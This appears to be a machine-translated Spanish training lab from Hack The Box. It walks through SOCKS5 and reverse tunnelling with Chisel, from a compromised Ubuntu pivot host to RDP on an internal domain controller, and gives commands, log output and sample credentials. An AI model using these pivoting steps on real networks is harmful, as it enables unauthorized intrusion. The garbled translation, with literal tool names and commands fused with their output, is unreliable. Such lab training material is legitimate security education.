# SOCKS5 Tunneling with Chisel

[Cincel](https://github.com/jpillora/chisel)es una herramienta de túneles basada en TCP/UDP escrita en[Ir](https://go.dev/)que utiliza HTTP para transportar datos asegurados con SSH.`Chisel`puede crear una conexión de túnel cliente-servidor en un entorno restringido de firewall. Consideremos un escenario en el que tenemos que túnel nuestro tráfico a un servidor web en el`172.16.5.0`/`23`Red (red interna). Tenemos el controlador de dominio con la dirección`172.16.5.19`. Esto no es directamente accesible para nuestro host de ataque ya que nuestro host de ataque y el controlador de dominio pertenecen a diferentes segmentos de red. Sin embargo, dado que hemos comprometido el servidor Ubuntu, podemos iniciar un servidor de cincel que escuchará en un puerto específico y reenviará nuestro tráfico a la red interna a través del túnel establecido.

# **Configurar y usar cincel**

Antes de que podamos usar el cincel, necesitamos tenerlo en nuestro host de ataque. Si no tenemos cincel en nuestro host de ataque, podemos clonar el repositorio del proyecto usando el comando directamente a continuación:

### **Cincel de clonación**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

Necesitaremos el lenguaje de programación`Go`Instalado en nuestro sistema para construir el binario de cincel. Con GO instalado en el sistema, podemos pasar a ese directorio y usar`go build`para construir el binario de cincel.

### **Construyendo el binario de cincel**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ cd chiselgo build

```

Puede ser útil tener en cuenta el tamaño de los archivos que transferimos a los objetivos en las redes de nuestro cliente, no solo por razones de rendimiento, sino también considerando la detección. Dos recursos beneficiosos para complementar este concepto en particular son la publicación de blog de OXDF "[Túneles con cincel y SSF](https://0xdf.gitlab.io/cheatsheets/chisel)"Y el tutorial de la caja de IPPSEC`Reddish`. IPPSEC comienza su explicación del cincel, construyendo el binario y reduciendo el tamaño del binario en la marca 24:29 de su[video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).

Una vez que se construye el binario, podemos usar`SCP`para transferirlo al host de pivote objetivo.

### **Transferencia de cincel binario al huésped pivot**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
ubuntu@10.129.202.64's password:
chisel                                        100%   11MB   1.2MB/s   00:09

```

Luego podemos iniciar el servidor/oyente de cincel.

### **Ejecutando el servidor de cincel en el host Pivot**

Calcetines5 túneles con cincel

```
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks52022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234

```

El oyente de cincel escuchará las conexiones entrantes en el puerto`1234`Usando SOCKS5 (`--socks5`) y reenvíelo a todas las redes a las que se puede acceder desde el host Pivot. En nuestro caso, el host Pivot tiene una interfaz en la red 172.16.5.0/23, que nos permitirá llegar a los hosts en esa red.

Podemos iniciar un cliente en nuestro host de ataque y conectarnos al servidor de cincel.

### **Conectarse al servidor de cincel**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected

```

Como puede ver en la salida anterior, el cliente de chisel ha creado un túnel TCP/UDP a través de HTTP asegurado utilizando SSH entre el servidor de chisel y el cliente y ha comenzado a escuchar en el puerto 1080. Ahora podemos modificar nuestro archivo proxychains.conf ubicado en`/etc/proxychains.conf`y agregar`1080`Puerto al final para que podamos usar proxychains para pivotar utilizando el túnel creado entre el puerto 1080 y el túnel SSH.

### **Edición y confirmación de proxychains.conf**

Podemos usar cualquier editor de texto que nos gustaría editar el archivo proxychains.conf, luego confirmar nuestros cambios de configuración usando`tail`.

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ tail -f /etc/proxychains.conf #
#       proxy types: http, socks4, socks5#        ( auth types supported: "basic"-http  "user/pass"-socks )#
[ProxyList]
# add proxy here ...# meanwile# defaults set to "tor"# socks4 	127.0.0.1 9050socks5 127.0.0.1 1080

```

Ahora, si usamos proxyChains con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado en el host Pivot.

### **Girando a la DC**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

# **Cincel renovado**

En el ejemplo anterior, utilizamos la máquina comprometida (Ubuntu) como nuestro servidor de cincel, enumerando en el puerto 1234. Aún así, puede haber escenarios en los que las reglas de firewall restringen las conexiones entrantes a nuestro objetivo comprometido. En tales casos, podemos usar cincel con la opción inversa.

Cuando el servidor de cincel tiene`--reverse`habilitado, los controles remotos se pueden prefijo`R`para denotar invertido. El servidor escuchará y aceptará conexiones, y se presentarán a través del cliente, lo que especificó el control remoto. Remotes revertidos especificando`R:socks`Escuchará en el puerto de calcetines predeterminado del servidor (1080) y terminará la conexión en el proxy interno de Socks5 del cliente.

Iniciaremos el servidor en nuestro host de ataque con la opción`--reverse`.

### **Iniciar el servidor de cincel en nuestro host de ataque**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks52022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234

```

Luego nos conectamos desde el Ubuntu (host Pivot) a nuestro host de ataque, usando la opción`R:socks`

### **Conectando al cliente de cincel a nuestro host de ataque**

Calcetines5 túneles con cincel

```
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected

```

Podemos usar cualquier editor que nos gustaría editar el archivo proxychains.conf, luego confirmar nuestros cambios de configuración usando`tail`.

### **Edición y confirmación de proxychains.conf**

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ tail -f /etc/proxychains.conf [ProxyList]
# add proxy here ...# socks4    127.0.0.1 9050socks5 127.0.0.1 1080

```

Si usamos proxyChains con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado para el host Pivot.

Calcetines5 túneles con cincel

```
xnoxos@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Nota:**Si recibe un mensaje de error con cincel en el objetivo, intente con un[Versión diferente](https://github.com/jpillora/chisel/releases).